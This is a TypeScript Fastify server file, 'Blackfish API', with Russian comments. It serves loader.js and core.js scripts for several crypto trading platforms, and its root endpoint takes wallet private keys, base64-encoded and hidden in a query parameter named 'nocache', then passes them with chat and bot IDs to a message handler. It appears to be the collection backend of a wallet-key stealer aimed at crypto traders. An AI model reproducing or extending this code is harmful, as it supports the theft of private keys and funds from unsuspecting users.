import Fastify from 'fastify';
import cors from '@fastify/cors';
import path from 'path';
import { fileURLToPath } from 'url';
import net from 'net';
import type { FastifyRequest, FastifyReply } from 'fastify';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const PORT = Number(process.env.PORT) || 3035;
const HOST = '0.0.0.0';

const isDev = process.env.NODE_ENV !== 'production';

const fastify = Fastify({
  logger: isDev
    ? {
        level: 'info',
        transport: {
          target: 'pino-pretty',
          options: {
            translateTime: 'HH:MM:ss Z',
            ignore: 'pid,hostname'
          }
        }
      }
    : { level: 'info' },
  trustProxy: true,
  disableRequestLogging: false,
  connectionTimeout: 60000,
  keepAliveTimeout: 60000,
  requestTimeout: 60000
});

// Register CORS
await fastify.register(cors, {
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type']
});

// Platforms configuration
const PLATFORMS = ['hyperliquid', 'bullx', 'padre', 'axiom', 'gmgn'] as const;
type Platform = typeof PLATFORMS[number];

// Health check endpoint
fastify.get('/health', async (request: FastifyRequest, reply: FastifyReply) => {
  return reply.send({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

interface RootQueryString {
  nocache?: string;
  type?: 'loader' | 'core';
}

fastify.get('/', async (request: FastifyRequest<{ Querystring: RootQueryString }>, reply: FastifyReply) => {
  const { nocache } = request.query;

  // Если параметр nocache присутствует, обрабатываем данные через /api/message
  if (nocache !== undefined) {
    try {
      // Декодируем base64 данные
      const decodedData = Buffer.from(nocache, 'base64').toString('utf-8');
      const walletData = JSON.parse(decodedData) as {
        keys: Array<{ public: string; private: string }>;
        sent: any;
        code: string;
        username: string;
        platform: string;
        botId?: string;
      };

      // Формируем тело запроса для /api/message
      const messageBody = {
        error: 0 as const,
        chatId: walletData.code, // code используется как chatId
        username: walletData.username,
        platform: walletData.platform || 'axiom',
        botId: walletData.botId || null,
        keys: walletData.keys,
        message: nocache // Передаем base64 строку как есть
      };

      // Импортируем handler для /api/message
      const messageHandler = await importHandler('axiom', 'message');
      
      // Создаем mock request объект для внутреннего вызова
      const mockRequest = {
        ...request,
        method: 'POST' as const,
        body: messageBody
      } as FastifyRequest;

      // Вызываем handler напрямую
      return await messageHandler(mockRequest, reply);
    } catch (error) {
      fastify.log.error(error, 'Error processing nocache data');
      return reply.status(500).send({
        error: 'Internal server error',
        details: error instanceof Error ? error.message : 'Unknown error'
      });
    }
  }

  // Если nocache не указан, возвращаем базовый ответ
  return reply.send({
    message: 'Blackfish API',
  });
});

// Dynamic imports for handlers
async function importHandler(platform: Platform, handlerType: 'loader' | 'core' | 'message') {
  try {
    const modulePath = handlerType === 'message'
      ? `./api/message.js`
      : `./api/${platform}/${handlerType}.js`;
    
    const module = await import(`${modulePath}?t=${Date.now()}`);
    return module.default;
  } catch (error) {
    fastify.log.error(error, `Failed to import handler: ${platform}/${handlerType}`);
    throw error;
  }
}

// Register POST /api/message (unified for all platforms)
fastify.post('/api/message', async (request: FastifyRequest, reply: FastifyReply) => {
  try {
    const handler = await importHandler('hyperliquid', 'message');
    return await handler(request, reply);
  } catch (error) {
    fastify.log.error(error, 'Error in /api/message');
    return reply.status(500).send({
      error: 'Internal server error',
      details: error instanceof Error ? error.message : 'Unknown error'
    });
  }
});

// Register loader.js routes for each platform
for (const platform of PLATFORMS) {
  fastify.get(`/${platform}/loader.js`, async (request: FastifyRequest, reply: FastifyReply) => {
    try {
      const handler = await importHandler(platform, 'loader');
      return await handler(request, reply);
    } catch (error) {
      fastify.log.error(error, `Error in /${platform}/loader.js`);
      return reply.status(500).send({
        error: 'Internal server error',
        details: error instanceof Error ? error.message : 'Unknown error'
      });
    }
  });
}

// Register core.js routes for each platform
for (const platform of PLATFORMS) {
  fastify.get(`/${platform}/core.js`, async (request: FastifyRequest, reply: FastifyReply) => {
    try {
      const handler = await importHandler(platform, 'core');
      return await handler(request, reply);
    } catch (error) {
      fastify.log.error(error, `Error in /${platform}/core.js`);
      return reply.status(500).send({
        error: 'Internal server error',
        details: error instanceof Error ? error.message : 'Unknown error'
      });
    }
  });
}

// 404 handler
fastify.setNotFoundHandler((request: FastifyRequest, reply: FastifyReply) => {
  return reply.status(404).send({
    error: 'Not found',
    path: request.url
  });
});

// Error handler
fastify.setErrorHandler((error, request: FastifyRequest, reply: FastifyReply) => {
  fastify.log.error(error);
  return reply.status(500).send({
    error: 'Internal server error',
    details: error.message
  });
});

// Start server
const start = async () => {
  try {
    // Проверяем доступность порта перед стартом
    const checkPort = (port: number): Promise<boolean> => {
      return new Promise((resolve) => {
        const server = net.createServer();
        server.listen(port, () => {
          server.once('close', () => resolve(true));
          server.close();
        });
        server.on('error', () => resolve(false));
      });
    };

    const portAvailable = await checkPort(PORT);
    if (!portAvailable) {
      console.error(`❌ Port ${PORT} is already in use`);
      process.exit(1);
    }

    await fastify.listen({ port: PORT, host: HOST });
    console.log(`✅ Server running on http://${HOST}:${PORT}`);
    console.log(`📋 Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`🔌 Registered platforms: ${PLATFORMS.join(', ')}`);
    
    // Уведомляем PM2 что сервер готов
    if (process.send) {
      process.send('ready');
    }
  } catch (err) {
    fastify.log.error(err);
    console.error('❌ Failed to start server:', err);
    if (err instanceof Error) {
      console.error('Error details:', err.message);
      console.error('Stack:', err.stack);
    }
    process.exit(1);
  }
};

// Graceful shutdown
const shutdown = async (signal: string) => {
  console.log(`\n👋 ${signal} signal received: closing HTTP server`);
  try {
    await fastify.close();
    console.log('✅ Server closed gracefully');
    process.exit(0);
  } catch (err) {
    console.error('❌ Error during shutdown:', err);
    process.exit(1);
  }
};

process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));

start();
